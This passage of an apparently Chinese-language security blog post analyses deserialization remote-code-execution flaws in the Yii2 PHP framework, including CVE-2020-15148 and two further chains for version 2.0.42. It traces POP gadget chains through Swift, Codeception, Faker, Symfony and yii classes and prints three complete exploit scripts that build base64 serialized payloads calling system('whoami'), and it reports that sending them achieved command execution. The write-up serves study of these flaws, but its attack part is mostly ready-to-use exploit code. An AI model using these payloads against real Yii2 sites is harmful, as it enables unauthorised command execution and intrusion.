        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$itemKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">hasKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">freeHandle</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>unlink</code>使用拼接字符串，<code>$this-&gt;path</code>可控，即可想到调用<code>__toString</code>方法（当一个对象被当做字符串使用时被调用）</p>
<p>全局查找<code>__toString()</code>方法，最好找一些<strong>调用其他类函数</strong>的<code>__toString</code></p>
<p>有如下的几个类中的<code>__toString</code>方法可用：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>DOMDocument</span><span class="token operator">::</span><span class="token constant">saveXML</span> 可以触发__call方法

<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> 可以触发__call方法

<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Deprecated</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> 可以触发__call方法

<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Generic</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> 可以触发__call方法

<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>See</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span>可以触发__call方法

<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Link</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span>

<span class="token operator">...</span></code></pre>

<p>这里以<code>\Codeception\Util\XmlBuilder::__toString</code>为例</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span><span class="token operator">-></span><span class="token function">saveXML</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>$this-&gt;__dom__</code>可控，在调用<code>saveXML()</code>方法的时候会调用<code>__call</code>方法。</p>
<p>pop链如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Swift_KeyCache_DiskKeyCache</span><span class="token operator">::</span><span class="token constant">__destruct</span> <span class="token operator">-></span> <span class="token property">clearAll</span> <span class="token operator">-></span> <span class="token property">clearKey</span> <span class="token operator">-></span> <span class="token property">__toString</span>
<span class="token operator">-></span> 
<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">saveXML</span>
<span class="token operator">-></span> 
<span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span> <span class="token operator">-></span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>Exp</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// EXP: Swift_KeyCache_DiskKeyCache::__destruct -> __toString -> __call</span>
<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token punctuation">;</span>
    <span class="token keyword">use</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$keys</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
                <span class="token string double-quoted-string">"extrader"</span> <span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"is"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"am"</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//注意 ClearAll中的数组解析了两次，之后再unlink</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XmlBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">XmlBuilder</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$__dom__</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Covers</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$refers</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$description</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">description</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">refers</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"AnyStringisOK"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>
            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'saveXML'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>发包，成功命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513201308446.png" alt loading="lazy"></p>
<h3 id="2-0-42反序列化"><a href="#2-0-42反序列化" class="headerlink" title="2.0.42反序列化"></a>2.0.42反序列化</h3><p>202108月更新，补两条新利用链</p>
<h4 id="POP5"><a href="#POP5" class="headerlink" title="POP5"></a>POP5</h4><p>Exp：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$default</span> <span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span> <span class="token operator">=</span> <span class="token variable">$argv</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$generator</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$validator</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$maxRetries</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span><span class="token variable">$argv</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span> <span class="token operator">=</span> <span class="token number">99999999</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>ValidGenerator</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span><span class="token variable">$argv</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ValidGenerator</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>pop链如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>ValidGenerator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span></code></pre>

<h4 id="POP6"><a href="#POP6" class="headerlink" title="POP6"></a>POP6</h4><p>Exp：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>String</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">LazyString</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">indexAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">UnicodeString</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LazyString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Faker</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>String<span class="token punctuation">\</span>LazyString</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LazyString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">UniqueGenerator</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span> <span class="token operator">=</span> <span class="token number">99999999</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>UniqueGenerator</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UniqueGenerator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">;</span>
    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>pop链如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>UniqueGenerator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">-></span>
<span class="token class-name class-name-fully-qualified static-context">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>String</span><span class="token operator">::</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">::</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">::</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>发现这几个pop链用来用去最后都是靠着<code>__call</code>方法来触发代码执行，代码审计的少，以后再遇到代码审计的问题可以多多考虑这一方面的东西</li>
<li>善于搜索，使用正则表达式，比如满足<code>\$this-&gt;(\w+)-&gt;(\w+)\(\)</code>这个正则的就可能可以触发<code>__call</code>方法</li>
<li>找链的开端可以尝试从<code>__destruct</code>入手，然后追链，追方法</li>
<li><code>call_user_func</code>中的<code>callback</code>可以是数组</li>
<li>整个pop链下来还是学到不少东西的，慢慢来吧</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://v0w.top/2020/09/22/Yii2unserialize/">Yii2 反序列化（CVE-2020-15148）学习笔记</a></li>
<li><a href="https://forum.butian.net/share/56">Yii反序列化漏洞复现到新利用链发现</a></li>
<li><a href="https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA">CVE-2020-15148 Yii2反序列化RCE POP链分析</a></li>
<li><a href="https://www.anquanke.com/post/id/217930">我是如何挖掘yii2反序列化0day的</a></li>
</ul>
